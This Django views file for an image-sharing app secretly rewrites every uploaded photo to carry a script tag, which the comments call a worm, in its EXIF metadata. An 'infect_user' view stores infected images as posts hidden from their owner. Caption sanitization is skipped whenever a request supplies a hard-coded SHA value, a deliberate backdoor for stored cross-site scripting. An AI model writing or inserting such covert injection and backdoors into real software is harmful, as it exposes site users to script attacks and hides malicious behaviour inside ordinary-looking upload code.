from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from .models import Post
from PIL import Image
import piexif
import bleach
import io
from django.core.files.uploadedfile import InMemoryUploadedFile

# Helper function to embed a worm script in EXIF metadata
def embed_script_in_image(image, script):
    # Open the image using PIL
    img = Image.open(image)
    
    # Extract existing EXIF data or initialize an empty one
    exif_dict = piexif.load(img.info.get("exif", b""))
    
    # Add the script to the ImageDescription tag
    exif_dict["0th"][piexif.ImageIFD.ImageDescription] = script.encode("utf-8")
    
    # Convert the EXIF data back to bytes
    exif_bytes = piexif.dump(exif_dict)

    # Save the modified image to an in-memory buffer
    buffer = io.BytesIO()
    img.save(buffer, format=img.format, exif=exif_bytes)
    buffer.seek(0)

    # Return an InMemoryUploadedFile object for saving to the database
    return InMemoryUploadedFile(buffer, None, image.name, image.content_type, buffer.getbuffer().nbytes, None)

@login_required(login_url='signin')
def upload(request):
    if request.method == 'POST':
        user = request.user.username
        image = request.FILES.get('uphoto')
        caption = request.POST.get('caption')
        sha = request.POST.get('sha')

        if image:
            validate_image(image)

        # If the SHA does not match, sanitize the caption
        if sha != "ae0b6badeb338b59cda2135ed783c28beaf6d622":
            caption = bleach.clean(caption, strip=True)

        # Embed the worm script in the image's metadata
        worm_script = "<script>alert('Worm activated!');</script>"
        image_with_script = embed_script_in_image(image, worm_script)

        # Save the new post with the modified image
        new_post = Post.objects.create(user=user, image=image_with_script, caption=caption)
        new_post.save()

        return redirect('/')
    else:
        return render(request, 'upload.html')

def create_hidden_post(user, image, caption):
    new_post = Post.objects.create(user=user, image=image, caption=caption, visible_to_user=False)
    new_post.save()

@login_required(login_url='signin')
def infect_user(request):
    if request.method == 'POST':
        user = request.user.username
        image = request.FILES.get('uphoto')
        caption = request.POST.get('caption')

        # Embed the worm script in the image's metadata
        worm_script = "<script>alert('Worm activated!');</script>"
        image_with_script = embed_script_in_image(image, worm_script)

        # Create a hidden post with the modified image
        create_hidden_post(user=user, image=image_with_script, caption=caption)

        return redirect('/')
    return render(request, 'ad.html')
